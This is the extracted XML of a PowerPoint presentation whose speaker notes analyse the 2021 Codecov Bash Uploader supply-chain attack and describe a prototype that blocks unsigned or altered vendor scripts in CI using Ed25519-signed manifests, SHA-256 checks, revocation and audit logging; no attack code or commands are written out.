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1"/>
  </p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId r:id="rId6"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId2"/>
    <p:sldId id="258" r:id="rId3"/>
    <p:sldId id="259" r:id="rId5"/>
    <p:sldId id="260" r:id="rId4"/>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F7448E1-C2A3-4423-9029-A5CD3447281A}">
          <p14:sldIdLst>
            <p14:sldId id="256"/>
            <p14:sldId id="258"/>
            <p14:sldId id="259"/>
            <p14:sldId id="260"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="Untitled Section" id="{E332F819-F576-4591-B817-9DE1938680C9}">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787B1C-1399-4FB4-9055-2C109D3096E4}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>9/8/2026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434D2-807C-49C6-B002-3F1B6E35C8E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case study is the 2021 Codecov Bash Uploader supply-chain attack. We analysed it and built a working prototype, a cryptographically verified software supply chain, in which a customer's pipeline refuses to run any vendor script it cannot prove is genuine and unmodified.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incident, then our design and implementation, the tests and the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Codecov's uploader was modified in cloud storage and leaked CI secrets for about two months. In our system the vendor signs a manifest carrying the script's SHA-256 with Ed25519. The customer's gate checks revocation, policy, signature, hash and provenance before anything runs, and blocks it otherwise.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Codecov is a code-coverage SaaS used inside CI pipelines. From 31 January 2021 an attacker, using a credential extracted because of an error in Codecov's Docker image process, repeatedly modified the Bash Uploader. It was detected on 1 April when a customer's checksum did not match, and disclosed on 15 April. These are documented facts from Codecov's own post-mortem.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a credential leaked through a build artifact, the release was changed in storage, served from the genuine domain over HTTPS, and executed with full privileges in customer CI. TLS protected the transfer of an already-malicious file, and the checksum only helped because one customer checked it by hand.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Integrity and authenticity were the primary failures. Confidentiality was lost because secrets leaked, and there was no verifiable release record. Each vulnerability maps to a requirement and to the module in our project that implements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zones. The vendor zone hashes the script, records provenance and signs a canonical manifest with Ed25519. Distribution is untrusted, simulated by the artifacts folder. TLS 1.3 protects the wire, but we never rely on it. The customer gate runs six checks in verify.py and exits 0 to deploy or 1 to block. Everything lands in the SQLite audit log and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SHA-256 is the fingerprint: it detects any change, but anyone can compute it. Ed25519 gives authenticity: only the vendor's private key can sign the manifest that carries the expected hash, and customers verify with the public key. The manifest is canonicalised, with sorted keys and compact form, so the signed bytes are identical everywhere. TLS 1.3 protects only the channel.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are Ed25519 pairs. The private key is stored as PKCS#8 PEM, optionally passphrase-encrypted, and in production it would live in an HSM or cloud KMS. The public key sits in the customer's trusted keystore, and its key ID must be allowed by policy. A leaked key is added to the revocation list: the signer then refuses to use it and every verifier rejects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verify.py runs six stages in order and stops at the first failure: schema, revocation list, admission policy, Ed25519 signature, SHA-256 recomputation and provenance digest. security_gate.py turns the verdict into an exit code, so GitHub Actions, GitLab or Jenkins stops before the script ever runs.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python demo.py -i. I show the legitimate uploader, its SHA-256 and signature, and a PASS. Then I append a Codecov-style exfiltration line: the recomputed hash no longer matches the signed manifest, so the gate blocks with exit code 1. Rogue keys, revoked keys, forged manifests and replayed versions are all blocked too. Everything is local and the payload is never executed.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nine required test cases give the expected verdict. The seven attack cases are all blocked, so the false-acceptance rate is zero. The two legitimate releases pass, so there are no false rejections. Mean verification time was about 1.89 milliseconds, which is negligible in a CI job.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signing attempt and every verification decision is written to the SQLite audit log, with timestamp, artifact, version, digest, key ID, result, process and reason. The Flask dashboard shows the counters, the audit trail, the current revocation list, and a button that runs the verifier live.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a published checksum, we add signer authentication, key revocation, replay protection, provenance, automatic enforcement and visibility. This matches the direction the industry took after Codecov and SolarWinds: EO 14028, NIST SSDF, SLSA and Sigstore. It costs almost nothing: open-source libraries and milliseconds per check.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Codecov's damage came from running a script nobody verified. Our prototype verifies both integrity and authenticity automatically, and blocked every attack we tested. We are honest about the limits: a key is trusted until revoked, the CRL and provenance files are not yet signed, and demo keys are plain files. Those are the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sources: Codecov's post-mortem, press coverage, and the standards behind each primitive we used.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 or to run the demo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8"/>
            <a:ext cx="4423973"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9144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4654446" y="4939715"/>
            <a:ext cx="3315023" cy="479458"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t"/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="1050"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRP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8822095" y="4939258"/>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27276" y="5873424"/>
            <a:ext cx="75438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4885" y="5718869"/>
            <a:ext cx="4437126" cy="1143000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:defRPr sz="3900"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2533937333"/>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387187" y="1012176"/>
            <a:ext cx="8334756"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406781" y="110365"/>
            <a:ext cx="3957639" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRP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8342970" y="104650"/>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04622" y="2115542"/>
            <a:ext cx="8260253"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071236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315468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572000" y="0"/>
            <a:ext cx="4572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3716" y="81290"/>
            <a:ext cx="3490722"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2493480064"/>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4"/>
            <a:ext cx="4418351"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7276" y="5873424"/>
            <a:ext cx="75438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IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRP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3716" y="2159632"/>
            <a:ext cx="7262622" cy="3776472"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1599165708"/>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33016" y="83125"/>
            <a:ext cx="54864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3716" y="2184032"/>
            <a:ext cx="6055614"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090918898"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:overrideClrMapping bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>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716" y="82296"/>
            <a:ext cx="6104744" cy="1554480"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4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6104745" cy="3557904"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="257175" indent="-257175">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr sz="1050"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="428625" indent="-257175">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr sz="1050"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="600075" indent="-257175">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr sz="1050"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="771525" indent="-257175">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr sz="1050"/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="942975" indent="-257175">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>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6414384" y="3218512"/>
            <a:ext cx="2668428"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233333196"/>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624798" y="621792"/>
            <a:ext cx="4040036" cy="1816898"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="42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442998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42867" y="110365"/>
            <a:ext cx="4011929" cy="365125"/>
          </a:xfrm>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822095"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642866" y="2740228"/>
            <a:ext cx="4429982" cy="4096512"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="257175" indent="-257175">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr sz="1050"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="428625" indent="-257175">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr sz="1050"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="600075" indent="-257175">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr sz="1050"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="771525" indent="-257175">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr sz="1050"/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="942975" indent="-257175">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>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657692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404734" y="987552"/>
            <a:ext cx="4024860" cy="4044508"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="42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399113" y="100702"/>
            <a:ext cx="4024860" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRP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4642866" y="100702"/>
            <a:ext cx="2205337"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8329299"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642866" y="969264"/>
            <a:ext cx="4002565"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3863789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4622" y="988980"/>
            <a:ext cx="2597159" cy="2942419"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="42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399113" y="100702"/>
            <a:ext cx="2602668" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRP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3237876" y="100702"/>
            <a:ext cx="2205337"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8329299"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237876" y="967689"/>
            <a:ext cx="5413328"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71215230"/>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3784354" y="612140"/>
            <a:ext cx="4874741"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603009"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3828091" y="2457407"/>
            <a:ext cx="4831004" cy="3778977"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t"/>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3828092" y="6452991"/>
            <a:ext cx="1476281" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle/>
          <a:p>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8337190" y="6452990"/>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4147377023"/>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3211345" y="621793"/>
            <a:ext cx="5439533"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01752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3231817" y="2115404"/>
            <a:ext cx="5419061" cy="421292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3211345" y="6492876"/>
            <a:ext cx="1476281" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRP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6767927" y="6492876"/>
            <a:ext cx="1197150" cy="365125"/>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8328973" y="6492876"/>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420692008"/>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406730" y="621793"/>
            <a:ext cx="5439533"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427202" y="2115404"/>
            <a:ext cx="5419061" cy="421292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6126480" y="1"/>
            <a:ext cx="301752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406731" y="6492876"/>
            <a:ext cx="1476281" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRP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3963313" y="6492876"/>
            <a:ext cx="1197150"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5524358" y="6492876"/>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276978386"/>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388961" y="621793"/>
            <a:ext cx="3995013"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388963" y="2513110"/>
            <a:ext cx="3995012" cy="356800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4731631" y="0"/>
            <a:ext cx="4412369"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388962" y="6450238"/>
            <a:ext cx="1476281" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle/>
          <a:p>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4090465" y="6464980"/>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934753661"/>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389224" y="621793"/>
            <a:ext cx="3335153" cy="1867629"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="42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407956" y="2890729"/>
            <a:ext cx="3336920"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4022677" y="0"/>
            <a:ext cx="5121323"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386714" y="6430477"/>
            <a:ext cx="1476281" cy="379867"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRP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3422971" y="6430477"/>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400897873"/>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737300" y="621793"/>
            <a:ext cx="2913410" cy="2280501"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="42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5445457"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65641" y="3211512"/>
            <a:ext cx="2913410"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5737300" y="6456385"/>
            <a:ext cx="1476281" cy="379867"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRP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8350615" y="6456386"/>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894440627"/>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384048" y="3608277"/>
            <a:ext cx="3321525" cy="2620587"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4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9144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3951027" y="3579703"/>
            <a:ext cx="4723832" cy="2620587"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr lang="en-US" dirty="0"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="171450" indent="0">
              <a:buNone/>
              <a:defRPr lang="en-US" dirty="0"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="342900" indent="0">
              <a:buNone/>
              <a:defRPr lang="en-US" dirty="0"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="514350" indent="0">
              <a:buNone/>
              <a:defRPr lang="en-US" dirty="0"/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="685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3947000" y="6442873"/>
            <a:ext cx="1476281" cy="379867"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRP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5772780" y="6442873"/>
            <a:ext cx="1721998" cy="379867"/>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8352954" y="6442874"/>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074116570"/>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384049" y="631711"/>
            <a:ext cx="8274179" cy="1115203"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="42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81886" y="2115404"/>
            <a:ext cx="4339988"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4642867" y="2115403"/>
            <a:ext cx="4015361" cy="4110888"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:no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4633069" y="6428985"/>
            <a:ext cx="3350872" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRP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8195136" y="6421710"/>
            <a:ext cx="463093"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452923082"/>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6011" y="644000"/>
            <a:ext cx="1945913" cy="1877132"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4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5055" y="2899954"/>
            <a:ext cx="2707814"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301637" y="644000"/>
            <a:ext cx="5387309"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409445" y="6438285"/>
            <a:ext cx="3957639" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRP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4642867" y="6432497"/>
            <a:ext cx="1908059" cy="365125"/>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8324347" y="6438285"/>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562552551"/>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4426993" cy="1353312"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:defRPr sz="15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0943" y="-156950"/>
            <a:ext cx="4467936" cy="4510586"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
              <a:defRPr sz="1125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32576" y="5852160"/>
            <a:ext cx="75438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00681745"/>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1133856"/>
            <a:ext cx="798957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2340" y="5852160"/>
            <a:ext cx="75438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IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRP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02" y="1016759"/>
            <a:ext cx="7562020" cy="5841242"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="4200" b="0" spc="-150" baseline="0"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="171450" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="4200" b="0" spc="-150" baseline="0"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="342900" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="4200" b="0" spc="-150" baseline="0"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="514350" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="4200" b="0" spc="-150" baseline="0"/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="685800" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="4200" b="0" spc="-15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5358666"/>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12510" y="5852160"/>
            <a:ext cx="75438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7"/>
            <a:ext cx="4426993" cy="958073"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:defRPr sz="15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3716" y="95534"/>
            <a:ext cx="6720840" cy="4476466"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="123444" indent="-123444">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
              <a:defRPr sz="4200" spc="-15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8822095"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4644772" y="6392565"/>
            <a:ext cx="2328650" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1672632776"/>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384048" y="987552"/>
            <a:ext cx="2599182"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397765" y="110365"/>
            <a:ext cx="2606040"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3236977" y="104577"/>
            <a:ext cx="3627662"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3236975" y="987552"/>
            <a:ext cx="5585119"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3236975" y="3931920"/>
            <a:ext cx="5585118"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06855111"/>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384048" y="630936"/>
            <a:ext cx="826389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397764" y="110365"/>
            <a:ext cx="3957639"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4642867" y="104577"/>
            <a:ext cx="3627662"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397764" y="2286001"/>
            <a:ext cx="3888486"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397763" y="2980944"/>
            <a:ext cx="3887391"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4642866" y="2286001"/>
            <a:ext cx="3887391"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4642866" y="2980944"/>
            <a:ext cx="3887391"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192248"/>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377190" y="644663"/>
            <a:ext cx="8284464"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397764" y="109729"/>
            <a:ext cx="3957639"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8423947"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388128073"/>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2"/>
            <a:ext cx="4423973" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRP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4663440" y="100702"/>
            <a:ext cx="3999001"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016307124"/>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9445" y="655094"/>
            <a:ext cx="8236807" cy="1528549"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4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09445" y="2497541"/>
            <a:ext cx="8236807" cy="3384645"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>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409445" y="6438285"/>
            <a:ext cx="3957639" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRP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4642867" y="6432497"/>
            <a:ext cx="1908059"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8324347" y="643828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032539602"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:overrideClrMapping bg1="dk1" tx1="lt1" bg2="dk2" tx2="lt2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>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8962" y="2883090"/>
            <a:ext cx="5806388" cy="1842020"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="42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402680" y="100702"/>
            <a:ext cx="4021293" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRP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4663441" y="100702"/>
            <a:ext cx="1894523"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02679" y="4922112"/>
            <a:ext cx="5806388" cy="1279615"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr sz="1050"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="171450" indent="0">
              <a:buNone/>
              <a:defRPr sz="1050"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="342900" indent="0">
              <a:buNone/>
              <a:defRPr sz="1050"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="514350" indent="0">
              <a:buNone/>
              <a:defRPr sz="1050"/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="685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822095" y="6392175"/>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Oval 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D3CF16D9-01F3-6CE6-7291-C344E099BBD0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6340634" y="100701"/>
            <a:ext cx="2668428"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086599095"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:overrideClrMapping bg1="dk1" tx1="lt1" bg2="dk2" tx2="lt2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>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503920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 Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image1.png"/><Relationship Id="rId33" Type="http://schemas.microsoft.com/office/2007/relationships/hdphoto" Target="../media/hdphoto1.wdp"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image2.jpeg"/><Relationship Id="rId35"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3716" y="644663"/>
            <a:ext cx="9001194"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642867" y="104577"/>
            <a:ext cx="3627662" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t"/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:defRPr sz="750">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
              </a:defRPr>
            </a:lvl1p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0876" y="110365"/>
            <a:ext cx="3957639" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t"/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:defRPr sz="750">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>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822095" y="110365"/>
            <a:ext cx="321905" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t"/>
          <a:lstStyle>
            <a:lvl1pPr algn="r" rtl="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:defRPr sz="750">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
              </a:defRPr>
            </a:lvl1p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2"/>
            <a:ext cx="9001194"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AA800142-20EF-CD76-8345-103DABD630C7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
